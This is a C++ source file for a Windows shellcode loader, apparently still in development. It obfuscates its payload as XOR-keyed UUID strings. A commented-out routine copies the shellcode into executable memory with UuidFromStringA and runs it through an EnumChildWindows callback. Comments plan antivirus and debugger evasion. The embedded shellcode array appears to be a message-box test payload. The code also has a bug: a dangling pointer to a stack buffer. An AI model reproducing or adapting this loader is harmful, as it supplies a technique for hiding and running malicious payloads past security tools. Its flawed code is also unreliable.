#include <windows.h>
#include <rpc.h>
#include <stdio.h>
#include <string.h>
#include <rpcdce.h>
#pragma comment(lib, "rpcrt4.lib")

#define PORT "25565" //Default port for Minecraft Java
#define SERV_ADDR "127.0.0.1"
#define DEFAULT_BUFFER_LEN 40000
using namespace std;



char** dec_uuids(char** data, int elements) {
	char* key = data[0];
	printf("key: %s\n", key);
	char* callcode = data[1];
	printf("callcode: %s\n", callcode);
	for (int i = 0; i < elements; i++) {
		printf("[*] Allocating %d of %d\n", i + 1, elements);
		printf("%s\n", data[i]);
  	}

  	for (int i = 1; i < elements; i++) {
		char* currStr = data[i];
		char temp[37] = "";
		printf("uuid value (encrypted): %s\n", currStr);
		for (int j = 0; j < 36; j+=2) {
			int keyHexVal;
			int strHexVal;
			char hexStr[3];
			if (currStr[j] != '-' && currStr[j+1] != '-'){
				sprintf(hexStr, "%c%c", currStr[j], currStr[j+1]);
				sscanf(hexStr, "%x", &strHexVal);
				//printf("str: %s", hexStr);
				sprintf(hexStr, "%c%c", key[j], key[j+1]);
				//printf(" | key: %s", hexStr);
				sscanf(hexStr, "%x", &keyHexVal);
				//printf("str: %c ^ %c =\n", curStr[j], key[j]);
				int dec = strHexVal ^ keyHexVal;
				//printf(" | xord: %x\n", dec);
				if (dec < 16){
					sprintf(hexStr, "0%x", dec);
				} else {
					sprintf(hexStr, "%x", dec);
				}
				//sprintf(hexStr, "%x", dec);
				strncat(temp, hexStr, 2);
			} else {
				j -= 1;
				strcat(temp, "-");
			}
		}
		data[i] = temp;
		printf("%d", i);
		printf("uuid value (decrypted): %s\n", data[i]);
	}
	printf("%s\n", data[0]);
	printf("%s\n", data[1]);
	return data;
}
/*
int decode(char** data, int elements) {

	//lpAddress, dwSize, flAllocationType, flProtect
	VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE); //hide this WinAPI call later
	DWORD_PTR scptr = (DWORD_PTR)mem;
	for (int i = 2; i < elements; i++) { //start at 2 bcs 0 is key and 1 is callcode
		//detect_debugger();
		
		// print statements for debugging
		printf("[*] Allocating %d of %d uuids\n", i + 1, elements);
		printf("%s\n", *(data + i));
		RPC_CSTR rpc_cstr = (RPC_CSTR) * (data + i);
		//	Invoking UuidFromStringA with a memory pointer instead of a UUID pointer results in
		//the binary repressentation of the given UUID being stored in memory.
		//This is engineered this way so that it is possible to load a payload content (shellcode) into the 
		//chosen memory region.
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rpc_cstr, (UUID*)scptr);
		if (status != RPC_S_OK) {
			printf("UUID Conversion Error");
			CloseHandle(mem);
			return -1;
		}
		scptr += 16; //increment position for the next UUID in memory (16 bytes ahead)
	}
	//Specify the memory region holding the shellcode for pointer to callback in EnumChildWindows (execution)
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
	CloseHandle(mem);
	return 0;
}*/

int main() {
	
	//char *[2]{(char *)(char *)((const char [37])"54686973-4973-416e-584f-526b65793031"), 
	//			(char *)(char *)((const char [37])"3c0d051f-2604-2e1c-342b-6359564d0507")}
	char* data[] = {
		"54686973-4973-416e-584f-526b65793031", //key "ThisIsAnXORkey01"
		"3c0d051f-2604-2e1c-342b-6359564d053e"  //encrypted "helloworld123456"
	};
	
	char* uuids[] = {
		"e48148fc-fff0-ffff-e8d0-000000415141",
		"56515250-3148-65d2-488b-52603e488b52",
		"8b483e18-2052-483e-8b72-503e480fb74a",
		"c9314d4a-3148-acc0-3c61-7c022c2041c1",
		"01410dc9-e2c1-52ed-4151-3e488b52203e",
		"483c428b-d001-8b3e-8088-0000004885c0",
		"01486f74-50d0-8b3e-4818-3e448b402049",
		"5ce3d001-ff48-3ec9-418b-34884801d64d",
		"3148c931-acc0-c141-c90d-4101c138e075",
		"034c3ef1-244c-4508-39d1-75d6583e448b",
		"01492440-66d0-413e-8b0c-483e448b401c",
		"3ed00149-8b41-8804-4801-d0415841585e",
		"58415a59-5941-5a41-4883-ec204152ffe0",
		"5a594158-483e-128b-e949-ffffff5d49c7",
		"000000c1-3e00-8d48-95fe-0000003e4c8d",
		"00010985-4800-c931-41ba-45835607ffd5",
		"41c93148-f0ba-a2b5-56ff-d54d656f772d",
		"776f656d-0021-5e3d-2e2e-5e3d00909090"
	};

    int data_elements = sizeof(data) / sizeof(data[0]);
    printf("[main] data's elements: %d\n", data_elements);
    char** new_data = dec_uuids(data, data_elements);

	printf("%s\n", new_data[0]);
	printf("%s\n", new_data[1]);

	
	//int uuids_elements = sizeof(uuids) / sizeof(uuids[0]);
    //printf("[main] uuids's elements: %d\n", uuids_elements);
	//dec_uuids(uuids, uuids_elements);
	//printf("callcode (decrypted): %s\n", *(data + 1));
	return 0;
}